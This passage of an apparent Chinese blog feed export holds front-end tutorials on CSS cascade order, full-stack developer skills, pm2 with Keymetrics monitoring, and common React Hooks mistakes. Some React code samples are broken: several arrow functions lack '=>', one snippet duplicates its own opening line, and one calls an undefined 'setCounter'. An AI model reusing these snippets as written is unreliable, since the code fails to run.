<hr>
<h2 id="比较顺序"><a href="#比较顺序" class="headerlink" title="比较顺序"></a>比较顺序</h2><ul>
<li>  当重要性一致并且设置的<code>属性冲突</code>时 才会去比较特殊性</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;当重要性一致时 id选择器的权重大于class选择器</span><br><span class="line"> .box&#123;</span><br><span class="line">       background: red !important;</span><br><span class="line">    &#125;</span><br><span class="line">    #box&#123;</span><br><span class="line">       background: green !important;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/10024246-1ae09aac7a39ae82.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<ul>
<li>  当特殊性一致时 才会去比较源次序</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;当两个都是class选择器时 书写靠后的代码优先显示</span><br><span class="line">.box&#123;</span><br><span class="line">       background: green ;</span><br><span class="line">   &#125;</span><br><span class="line">   .box&#123;</span><br><span class="line">       background: red ;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/10024246-9a1bf0d0b20de846.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<hr>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><ul>
<li>  由于我们<code>自己写的代码的重要性高于浏览器默认样式</code></li>
</ul>
<p>所以我们可以在制作页面之前链接一份<code>重置样式表</code> 把我们不想要的默认样式给覆盖掉 比如无序列表的小圆点 去除默认的外边距内边距等等</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;reset.css&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>  CSS存在继承机制 但是<code>CSS的继承是发生在层叠之后的</code></li>
</ul>
<p>这就是有时候为什么明明样式继承了父元素、权重也没有错却没有显示的问题</p>
<p>原因就是继承的样式被浏览器的默认样式给覆盖了</p>
<blockquote>
<p>本文链接：<a href="https://blog.csdn.net/weixin_45178648/article/details/104897517">https://blog.csdn.net/weixin_45178648/article/details/104897517</a></p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>什么是全栈开发者？</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E4%BB%80%E4%B9%88%E6%98%AF%E5%85%A8%E6%A0%88%E5%BC%80%E5%8F%91%E8%80%85%EF%BC%9F/</url>
    <content><![CDATA[<p>英文原文：What is a Full Stack developer?<br>翻译者来自<a href="http://www.oschina开源社区./">www.oschina开源社区。</a></p>
<hr>
<p>最近很流行全栈开发，那么全栈开发者是什么意思呢？</p>
<p>对我来说全栈开发者是对每一层都熟悉的人，如果不真正对所有的软件技术感兴趣不会对它们精通。<br>好的开发者熟悉整个堆栈，他们是知道如何使生活周边的事更容易的人。这就是为什么在办公室我如此反对偏执的原因，当然，政治及沟通挑战在大型组织中还是按固有的套路。我认为Facebook所持有的招聘政策是：如果聪明的人用脑用心，就能在更短的时间内构件更好的产品。</p>
<hr>
<p><strong>全栈的层：</strong></p>
<p>1、服务器、网络和服务器环境<br>知道哪里可能崩了和为什么会崩，没有什么是理所当然的。<br>适当的使用文件系统，云存储、网络资源，必须具备数据冗余和可用性的概念。<br>知道应用的伸缩性对硬件的需求。<br>什么是多线程和竞争条件？想想看，在开发机上你可能看不到这些，但是现实环境中它们就是会发生。<br>全栈coder还要能与运维并肩作战。提供有价值的错误信息和日志。确保它们是可靠的，因为运维会在你之前看到这些东西。（原文为DevOps）<br>2、数据建模<br>如果数据模型有缺陷，业务逻辑和上层逻辑就要用奇怪的代码（很丑）来弥补数据模型的缺陷。<br>全栈开发者要能够建立合理的、标准的关系模型，包括外键、索引、视图、查找表等。<br>全栈开发者要熟悉非关系型数据存储（应该指的不止是NoSQL），并且知道它们相对关系型存储优势所在。<br>3、业务逻辑<br>应用提供的核心价值。<br>可靠的面向对象技能。<br>可能会用到的框架。<br>4、API层、Action 层、MVC<br>理解外部对数据模型和业务逻辑的操作。<br>该层会有很多框架应用。<br>全栈开发者要具备编写清晰、一致和易用的接口。过高的复杂度让人厌恶。<br>5、UI<br>全栈coder：a)知道如何创建可读的页面布局；b)或者明白自己需要帮助设计师。A或B，关键是要能有好的视觉设计。<br>掌握HTML5和CSS。<br>JS正在逐步成为语言新锐，Javascript的世界里已经完成了很多激动人心的工作（node, backbone, knockout…）。<br>6.用户体验<br>全栈coder要知道用户需要的就是It works！<br>一个好的系统不会废了用户的手腕和眼睛。一个全栈coder会发现和审视需要8次点击、3步操作的流程，并最终把它一键搞定。<br>提供有价值的错误信息。如果崩溃了，就要向用户致歉。有时候程序员会写出让用户自我感觉很二的错误信息。<br>7.知道用户和业务到底要什么<br>现在我们模糊了架构的界限，但却可能远离了实际需求。<br>全栈coder要明确知道用户使用软件时的场景，而且要领会业务。</p>
<p><strong>关于这个问题的其它方面：</strong><br>编写高质量的单元测试能力。顺便说一下现如今连JS也可以做单元测试了。<br>持续集成。发掘程序构建中重复、可自动化的流程，在一定程度上自动完成测试、文档和部署。<br>对安全性的敏感，不同的层都可能有自己的脆弱点。<br><strong>最后：</strong><br>应用严重依赖一个特定的第三方实现（lib、系统、硬件等）是非常糟糕的实践。全栈开发者要知道了解全面不代表就可以走捷径。当然在抛弃原型法中，他们可以这么干。<br>在技术起步时很需要全栈开发者的多面技能。然而，在团队定型后，会越来越需要专注技能。<br>我不觉得在具备了多语言、多平台甚至跨行业的职业生涯之前，你可以称自己为全栈开发者。全栈远超“高级工程师”，它更接近是多语言的开发者并且能在更高的角度看到之间的关联。注意在我的列表中只有3-5项涉及到编码。</p>
<hr>
<p><a href="http://www.oschina.net/translate/what-is-a-full-stack-developer">http://www.oschina.net/translate/what-is-a-full-stack-developer</a></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>使用keymetrics实时监控Node.js程序</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E4%BD%BF%E7%94%A8keymetrics%E5%AE%9E%E6%97%B6%E7%9B%91%E6%8E%A7Node%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<p>通过pm2能守护node.js程序永远在线，在实际应用中是非常有必要的。另外，pm2配合keymetrics能实时监控node.js程序的运行，达到监控node.js程序的目的。</p>
<blockquote>
<p>安装pm2</p>
</blockquote>
<p>pm2可以使我们的node.js或io.js程序永远在线。这是<a href="https://www.npmjs.com/package/pm2">pm2</a>的官方介绍：</p>
<p><code>PM2 is a production process manager for Node.js applications with a built-in load balancer. It allows you to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks.</code></p>
<p>安装pm2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g pm2</span><br></pre></td></tr></table></figure>
<p>启动一个node.js程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;进入到app的目录去启动&#96;</span><br><span class="line"></span><br><span class="line">pm2 start index.js --name &#39;ghost&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其他常用命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;查看pm2守护的app</span><br><span class="line">pm2 list</span><br><span class="line">&#x2F;&#x2F;或者</span><br><span class="line">pm2 status</span><br><span class="line">&#x2F;&#x2F;重启，restart后面跟--name后面指定的名字</span><br><span class="line">pm2 restart ghost</span><br><span class="line">&#x2F;&#x2F;查看进程的使用资源情况</span><br><span class="line">pm2 monit</span><br><span class="line">&#x2F;&#x2F;查看log</span><br><span class="line">pm2 logs ghost</span><br><span class="line">&#x2F;&#x2F;查看app的更多详细信息，后面跟id</span><br><span class="line">pm2 describe 1</span><br><span class="line">&#x2F;&#x2F;升级pm2，升级完毕后自动加载之前运行中的所有app</span><br><span class="line">npm install pm2@latest -g ; pm2 updatePM2</span><br></pre></td></tr></table></figure>

<p>使用Keymetrics可以配合pm2来监控node.js程序（也支持io.js程序的监控）。</p>
<blockquote>
<p>安装Keymetrics<br>首先需要注册Keymetrics：<br><a href="https://app.keymetrics.io/#/register">https://app.keymetrics.io/#/register</a></p>
</blockquote>
<p>登录后，通过new bucket新建，然后进入控制面板，可以看到分配的public key 和secret key。然后，在安装有pm2的服务器端输入以下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pm2 interact your-secret-key your-public-key</span><br></pre></td></tr></table></figure>

<p>监控成功后，会有类似下面的提示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Keymetrics.io] [Agent created] Agent ACTIVE - Web Access: [https:&#x2F;&#x2F;app.keymetrics.io&#x2F;](https:&#x2F;&#x2F;app.keymetrics.io&#x2F;)</span><br></pre></td></tr></table></figure>
<p>此时，pm2会把收集到的统计信息实时地推送到Keymetrics，我们可以在Keymetrics的后台中实时地查看到node.js程序的运行信息，其中还有一些快捷操作，如重启node.js程序等。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-cb89932826f59578.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>使用React Hooks 时要避免的5个错误！</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E4%BD%BF%E7%94%A8ReactHooks%E6%97%B6%E8%A6%81%E9%81%BF%E5%85%8D%E7%9A%845%E4%B8%AA%E9%94%99%E8%AF%AF%EF%BC%81/</url>
    <content><![CDATA[<p>本文已经过原作者 Shadeed 授权翻译。</p>
<p>很有可能你已经读过很多关于如何使用React Hook 的文章。但有时候，知道何时不使用与知道如何使用同样重要。</p>
<p>在这篇文章中，主要介绍一下 React hooks 错误使用方式，以及如何解决它们。</p>
<ul>
<li>  不要更改 Hook 调用顺序</li>
<li>  不要使用过时状态</li>
<li>  不要创建过时的闭包</li>
<li>  不要将状态用于基础结构数据</li>
<li>  不要忘记清理副作用</li>
</ul>
<h3 id="1-不要更改-Hook-调用顺序"><a href="#1-不要更改-Hook-调用顺序" class="headerlink" title="1.不要更改 Hook 调用顺序"></a>1.不要更改 Hook 调用顺序</h3><p>在写这篇文章的前几天，我编写了一个通过id获取游戏信息的组件，下面是一个简单的版本 <code>FetchGame</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function FetchGame(&#123; id &#125;) &#123;</span><br><span class="line">  if (!id) &#123;</span><br><span class="line">    return &#39;Please select a game to fetch&#39;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  const [game, setGame] &#x3D; useState(&#123; </span><br><span class="line">    name: &#39;&#39;,</span><br><span class="line">    description: &#39;&#39; </span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  useEffect(() &#x3D;&gt; &#123;</span><br><span class="line">    const fetchGame &#x3D; async () &#x3D;&gt; &#123;</span><br><span class="line">      const response &#x3D; await fetch(&#96;&#x2F;api&#x2F;game&#x2F;$&#123;id&#125;&#96;);</span><br><span class="line">      const fetchedGame &#x3D; await response.json();</span><br><span class="line">      setGame(fetchedGame);</span><br><span class="line">    &#125;;</span><br><span class="line">    fetchGame();</span><br><span class="line">  &#125;, [id]);</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;div&gt; &lt;div&gt;Name: &#123;game.name&#125;&lt;&#x2F;div&gt; &lt;div&gt;Description: &#123;game.description&#125;&lt;&#x2F;div&gt; &lt;&#x2F;div&gt;</span><br><span class="line">  ); </span><br></pre></td></tr></table></figure>

<p>组件<code>FetchGame</code> 接收 <code>id</code>（即要获取的游戏的ID）。<code>useEffect()</code>  在<code>await fetch(/game/$&#123;id&#125;)</code>提取游戏信息并将其保存到状态变量<code>game</code>中。</p>
<p>打开演示(<a href="https://codesandbox.io/s/hooks-order-warning-rdxpg?file=/pages/index.js">https://codesandbox.io/s/hooks-order-warning-rdxpg?file=/pages/index.js</a>) 。组件正确地执行获取操作，并使用获取的数据更新状态。但是看看tab Eslint警告: 有 Hook 执行顺序不正确的问题。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-147e46cb421a86ae?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p>问题发生在这一判断：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function FetchGame(&#123; id &#125;) &#123;</span><br><span class="line"> if (!id) &#123; return &#39;Please select a game to fetch&#39;; &#125;  </span><br><span class="line">   &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当<code>id</code>为空时，组件渲染<code>&#39;Please select a game to fetch&#39;</code>并退出，不调用任何 Hook。</p>
<p>但是，如果 <code>id</code>不为空（例如等于’1’），则会调用<code>useState()</code>和 <code>useEffect()</code>。</p>
<p>有条件地执行 Hook 可能会导致难以调试的意外错误。React Hook的内部工作方式要求组件在渲染之间总是以相同的顺序调用 Hook。</p>
<p>这正是钩子的第一条规则:不要在循环、条件或嵌套函数内调用 Hook。</p>
<p>解决方法就是将条件判断放到 Hook 后面：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function FetchGame(&#123; id &#125;) &#123;</span><br><span class="line">  const [game, setGame] &#x3D; useState(&#123; </span><br><span class="line">    name: &#39;&#39;,</span><br><span class="line">    description: &#39;&#39; </span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  useEffect(() &#x3D;&gt; &#123;</span><br><span class="line">    const fetchGame &#x3D; async () &#x3D;&gt; &#123;</span><br><span class="line">      const response &#x3D; await fetch(&#96;&#x2F;api&#x2F;game&#x2F;$&#123;id&#125;&#96;);</span><br><span class="line">      const fetchedGame &#x3D; await response.json();</span><br><span class="line">      setGame(fetchedGame);</span><br><span class="line">    &#125;;</span><br><span class="line"> if (id) &#123;      fetchGame();     &#125;  &#125;, [id]);</span><br><span class="line"></span><br><span class="line"> if (!id) &#123; return &#39;Please select a game to fetch&#39;; &#125;</span><br><span class="line">  return (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line"> &lt;div&gt;Name: &#123;game.name&#125;&lt;&#x2F;div&gt;</span><br><span class="line"> &lt;div&gt;Description: &#123;game.description&#125;&lt;&#x2F;div&gt;</span><br><span class="line"> &lt;&#x2F;div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在，无论<code>id</code>是否为空，<code>useState()</code>和<code>useEffect()</code> 总是以相同的顺序被调用，这就是 Hook 应该始终被调用的方式。</p>
<h3 id="2-不要使用过时状态"><a href="#2-不要使用过时状态" class="headerlink" title="2.不要使用过时状态"></a>2.不要使用过时状态</h3><p>下面的组件<code>MyIncreaser</code>在单击按钮时增加状态变量<code>count</code>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function MyIncreaser() &#123;</span><br><span class="line">  const [count, setCount] &#x3D; useState(0);</span><br><span class="line"></span><br><span class="line">  const increase &#x3D; useCallback(() &#x3D;&gt; &#123;</span><br><span class="line">    setCount(count + 1);</span><br><span class="line">  &#125;, [count]);</span><br><span class="line"></span><br><span class="line">  const handleClick &#x3D; () &#123;</span><br><span class="line"> increase(); increase(); increase();  &#125;;</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;&gt;</span><br><span class="line"> &lt;button onClick&#x3D;&#123;handleClick&#125;&gt;Increase&lt;&#x2F;button&gt;</span><br><span class="line"> &lt;div&gt;Counter: &#123;count&#125;&lt;&#x2F;div&gt;</span><br><span class="line"> &lt;&#x2F;&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有趣一点的是，<code>handleClick</code>调用了3次状态更新。</p>
<p>现在，在打开演示之前，问一个问题：如果单击一次按钮，计数器是否增加<code>3</code>？</p>
<p>打开演示（<a href="https://codesandbox.io/s/stale-variable-jo32q?file=/src/index.js%EF%BC%89%EF%BC%8C%E7%82%B9%E5%87%BB%E6%8C%89%E9%92%AE%E4%B8%80%E6%AC%A1%EF%BC%8C%E7%9C%8B%E7%9C%8B%E7%BB%93%E6%9E%9C%E3%80%82">https://codesandbox.io/s/stale-variable-jo32q?file=/src/index.js），点击按钮一次，看看结果。</a></p>
<p>不好意思，即使在<code>handleClick()</code>中3次调用了<code>increase()</code>，计数也只增加了<code>1</code>。</p>
<p>问题在于<code>setCount(count + 1)</code>状态更新器。当按钮被点击时，React调用<code>setCount(count + 1)</code>3次</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> const handleClick &#x3D; () &#123;</span><br><span class="line">    increase();</span><br><span class="line">    increase();</span><br><span class="line">    increase();</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 等价:</span><br><span class="line"></span><br><span class="line">  const handleClick &#x3D; () &#123;</span><br><span class="line">    setCount(count + 1);</span><br><span class="line">    &#x2F;&#x2F; count variable is now stale</span><br><span class="line">    setCount(count + 1);</span><br><span class="line">    setCount(count + 1);</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<p><code>setCount(count + 1)</code>的第一次调用正确地将计数器更新为<code>count + 1 = 0 + 1 = 1</code>。但是，接下来的两次<code>setCount(count + 1)</code>调用也将计数设置为<code>1</code>，因为它们使用了过时的<code>stale</code>状态。</p>
<p>通过使用函数方式更新状态来解决过时的状态。我们用<code>setCount(count =&gt; count + 1)</code>代替<code>setCount(count + 1)</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function MyIncreaser() &#123;</span><br><span class="line">  const [count, setCount] &#x3D; useState(0);</span><br><span class="line"></span><br><span class="line">  const increase &#x3D; useCallback(() &#x3D;&gt; &#123;</span><br><span class="line"> setCount(count &#x3D;&gt; count + 1);  &#125;, []);</span><br><span class="line"></span><br><span class="line">  const handleClick &#x3D; () &#123;</span><br><span class="line">    increase();</span><br><span class="line">    increase();</span><br><span class="line">    increase();</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;&gt;</span><br><span class="line"> &lt;button onClick&#x3D;&#123;handleClick&#125;&gt;Increase&lt;&#x2F;button&gt;</span><br><span class="line"> &lt;div&gt;Counter: &#123;count&#125;&lt;&#x2F;div&gt;</span><br><span class="line"> &lt;&#x2F;&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有一个好规则可以避免遇到过时的变量：</p>
<p>如果你使用当前状态来计算下一个状态，总是使用函数方式来更新状态:<code>setValue(prevValue =&gt; prevValue + someResult)</code>。</p>
<h3 id="3-不要创建过时的闭包"><a href="#3-不要创建过时的闭包" class="headerlink" title="3.不要创建过时的闭包"></a>3.不要创建过时的闭包</h3><p>React Hook 很大程序上依赖于闭包的概念。依赖闭包是它们如此富有表现力的原因。</p>
<p>JavaScript 中的闭包是从其词法作用域捕获变量的函数。不管闭包在哪里执行，它总是可以从定义它的地方访问变量。</p>
<p>当使用 Hook 接受回调作为参数时(如<code>useEffect(callback, deps)</code>， <code>useCallback(callback, deps))</code>，你可能会创建一个过时的闭包，一个捕获了过时的状态或变量的闭包。</p>
<p>我们来看看一个使用<code>useEffect(callback, deps)</code> 而忘记正确设置依赖关系时创建的过时闭包的例子。</p>
<p>在组件<code>&lt;WatchCount&gt;</code>中，<code>useEffect()</code>每2秒打印一次<code>count</code>的值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const [count, setCount] &#x3D; useState(0);</span><br><span class="line"></span><br><span class="line">  useEffect(function() &#123;</span><br><span class="line">    setInterval(function log() &#123;</span><br><span class="line">      console.log(&#96;Count is: $&#123;count&#125;&#96;);</span><br><span class="line">    &#125;, 2000);</span><br><span class="line">  &#125;, []);</span><br><span class="line"></span><br><span class="line">  const handleClick &#x3D; () &#x3D;&gt; setCount(count &#x3D;&gt; count + 1);</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;&gt; &lt;button onClick&#x3D;&#123;handleClick&#125;&gt;Increase&lt;&#x2F;button&gt; &lt;div&gt;Counter: &#123;count&#125;&lt;&#x2F;div&gt; &lt;&#x2F;&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打开演示(<a href="https://codesandbox.io/s/stale-variable-jo32q?file=/src/index.js)%EF%BC%8C%E7%82%B9%E5%87%BB%E6%8C%89%E9%92%AE%E3%80%82%E5%9C%A8%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%9F%A5%E7%9C%8B%EF%BC%8C%E6%AF%8F2%E7%A7%92%E6%89%93%E5%8D%B0%E7%9A%84%E9%83%BD">https://codesandbox.io/s/stale-variable-jo32q?file=/src/index.js)，点击按钮。在控制台查看，每2秒打印的都</a> 是 <code>Count is: 0</code>,，不管<code>count</code>状态变量的实际值是多少。</p>
<p>为啥这样子？</p>
<p>第一次渲染时， <code>log</code> 函数捕获到的 <code>count</code> 的值为 <code>0</code>。</p>
<p>之后，当按钮被单击并且<code>count</code>增加时，<code>setInterval</code>取到的 <code>count</code> 值仍然是从初始渲染中捕获<code>count</code>为0的值。<code>log</code> 函数是一个过时的闭包，因为它捕获了一个过时的状态变量<code>count</code>。</p>
<p>解决方案是让<code>useEffect()</code>知道闭包<code>log</code>依赖于<code>count</code>，并正确重置计时器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function WatchCount() &#123;</span><br><span class="line">  const [count, setCount] &#x3D; useState(0);</span><br><span class="line"></span><br><span class="line">  useEffect(function() &#123;</span><br><span class="line">    const id &#x3D; setInterval(function log() &#123;</span><br><span class="line">      console.log(&#96;Count is: $&#123;count&#125;&#96;);</span><br><span class="line">    &#125;, 2000);</span><br><span class="line"> return () &#x3D;&gt; clearInterval(id); &#125;, [count]);</span><br><span class="line">  const handleClick &#x3D; () &#x3D;&gt; setCount(count &#x3D;&gt; count + 1);</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;&gt;</span><br><span class="line"> &lt;button onClick&#x3D;&#123;handleClick&#125;&gt;Increase&lt;&#x2F;button&gt;</span><br><span class="line"> &lt;div&gt;Counter: &#123;count&#125;&lt;&#x2F;div&gt;</span><br><span class="line"> &lt;&#x2F;&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正确设置依赖关系后，一旦<code>count</code>发生变化，<code>useEffect()</code>就会更新<code>setInterval()</code>的闭包。</p>
<p>为了防止闭包捕获旧值：确保提供给 Hook 的回调函数中使用依赖项。</p>
<h3 id="4-不要将状态用于基础结构数据"><a href="#4-不要将状态用于基础结构数据" class="headerlink" title="4.不要将状态用于基础结构数据"></a>4.不要将状态用于基础结构数据</h3><p>有一次，我需要在状态更新上调用副作用，在第一个渲染不用调用副作用。<code>useEffect(callback, deps)</code>总是在挂载组件后调用回调函数:所以我想避免这种情况。</p>
<p>我找到了以下的解决方案</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function MyComponent() &#123;</span><br><span class="line">  const [isFirst, setIsFirst] &#x3D; useState(true);</span><br><span class="line">  const [count, setCount] &#x3D; useState(0);</span><br><span class="line"></span><br><span class="line">  useEffect(() &#x3D;&gt; &#123;</span><br><span class="line">    if (isFirst) &#123;</span><br><span class="line">      setIsFirst(false);</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">    console.log(&#39;The counter increased!&#39;);</span><br><span class="line">  &#125;, [count]);</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;button onClick&#x3D;&#123;() &#x3D;&gt; setCount(count &#x3D;&gt; count + 1)&#125;&gt; Increase &lt;&#x2F;button&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>状态变量<code>isFirst</code>用来判断是否是第一次渲染。一旦更新<code>setIsFirst(false)</code>，就会出现另一个无缘无故的重新渲染。</p>
<p>保持<code>count</code>状态是有意义的，因为界面需要渲染 count 的值。但是，<code>isFirst</code>不能直接用于计算输出。</p>
<p>是否为第一个渲染的信息不应存储在该状态中。基础结构数据，例如有关渲染周期（即首次渲染，渲染数量），计时器ID（<code>setTimeout()</code>，<code>setInterval()</code>），对DOM元素的直接引用等详细信息，应使用引用<code>useRef()</code>进行存储和更新。</p>
<p>我们将有关首次渲染的信息存储到 Ref 中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> const isFirstRef &#x3D; useRef(true);  const [count, setCount] &#x3D; useState(0);</span><br><span class="line"></span><br><span class="line">  useEffect(() &#x3D;&gt; &#123;</span><br><span class="line">    if (isFirstRef.current) &#123;</span><br><span class="line">      isFirstRef.current &#x3D; false;</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">    console.log(&#39;The counter increased!&#39;);</span><br><span class="line">  &#125;, [count]);</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;button onClick&#x3D;&#123;() &#x3D;&gt; setCounter(count &#x3D;&gt; count + 1)&#125;&gt;</span><br><span class="line"> Increase</span><br><span class="line"> &lt;&#x2F;button&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>isFirstRef</code>是一个引用，用于保存是否为组件的第一个渲染的信息。<code>isFirstRef.current</code>属性用于访问和更新引用的值。</p>
<p><strong>重要说明：更新参考<code>isFirstRef.current = false</code>不会触发重新渲染。</strong></p>
<h3 id="5-不要忘记清理副作用"><a href="#5-不要忘记清理副作用" class="headerlink" title="5.不要忘记清理副作用"></a>5.不要忘记清理副作用</h3><p>很多副作用，比如获取请求或使用<code>setTimeout()</code>这样的计时器，都是异步的。</p>
<p>如果组件卸载或不再需要该副作用的结果，请不要忘记清理该副作用。</p>
<p>下面的组件有一个按钮。当按钮被点击时，计数器每秒钟延迟增加<code>1</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function DelayedIncreaser() &#123;  const [count, setCount] &#x3D; useState(0);  const [incrfunction DelayedIncreaser() &#123;</span><br><span class="line">  const [count, setCount] &#x3D; useState(0);</span><br><span class="line">  const [increase, setShouldIncrease] &#x3D; useState(false);</span><br><span class="line"></span><br><span class="line">  useEffect(() &#x3D;&gt; &#123;</span><br><span class="line">    if (increase) &#123;</span><br><span class="line">      setInterval(() &#x3D;&gt; &#123;</span><br><span class="line">        setCount(count &#x3D;&gt; count + 1)</span><br><span class="line">      &#125;, 1000);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, [increase]);</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;&gt; &lt;button onClick&#x3D;&#123;() &#x3D;&gt; setShouldIncrease(true)&#125;&gt; Start increasing &lt;&#x2F;button&gt; &lt;div&gt;Count: &#123;count&#125;&lt;&#x2F;div&gt; &lt;&#x2F;&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>打开演示（<a href="https://codesandbox.io/s/unmounted-state-update-n1d3u?file=/src/index.js%EF%BC%89%EF%BC%8C%E7%82%B9%E5%87%BB%E5%BC%80%E5%A7%8B%E6%8C%89%E9%92%AE%E3%80%82%E6%AD%A3%E5%A6%82%E9%A2%84%E6%9C%9F%E7%9A%84%E9%82%A3%E6%A0%B7%EF%BC%8C%E7%8A%B6%E6%80%81%E5%8F%98%E9%87%8F%60count%60%E6%AF%8F%E7%A7%92%E9%92%9F%E9%83%BD%E4%BC%9A%E5%A2%9E%E5%8A%A0%E3%80%82">https://codesandbox.io/s/unmounted-state-update-n1d3u?file=/src/index.js），点击开始按钮。正如预期的那样，状态变量`count`每秒钟都会增加。</a></p>
<p>在进行递增操作时，单击<code>umount</code> 按钮，卸载组件。React会在控制台中警告更新卸载组件的状态。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-35c8a5691d0d6056?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p>修复<code>DelayedIncreaser</code>很简单：只需从<code>useEffect()</code>的回调中返回清除函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &#x2F;&#x2F; ...</span><br><span class="line"></span><br><span class="line">  useEffect(() &#x3D;&gt; &#123;</span><br><span class="line">    if (increase) &#123;</span><br><span class="line">      const id &#x3D; setInterval(() &#x3D;&gt; &#123;</span><br><span class="line">        setCount(count &#x3D;&gt; count + 1)</span><br><span class="line">      &#125;, 1000);</span><br><span class="line"> return () &#x3D;&gt; clearInterval(id);    &#125;</span><br><span class="line">  &#125;, [increase]);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是说，每次编写副作用代码时，都要问自己它是否应该清理。计时器，频繁请求(如上传文件)，sockets 几乎总是需要清理。</p>
<h3 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h3><p>从React钩子开始的最好方法是学习如何使用它们。</p>
<p>但你也会遇到这样的情况:你无法理解为什么他们的行为与你预期的不同。知道如何使用React Hook还不够:你还应该知道何时不使用它们。</p>
<p>首先不要做的是有条件地渲染 Hook 或改变 Hook 调用的顺序。无论Props 或状态值是什么，React都期望组件总是以相同的顺序调用Hook。</p>
<p>要避免的第二件事是使用过时的状态值。要避免过时 状态，请使用函数方式更新状态。</p>
<p>不要忘记指出接受回调函数作为参数的 Hook 的依赖关系:例如<code>useEffect(callback, deps)</code>，<code>useCallback(callback, deps</code>),这可以解决过时闭包问题。</p>
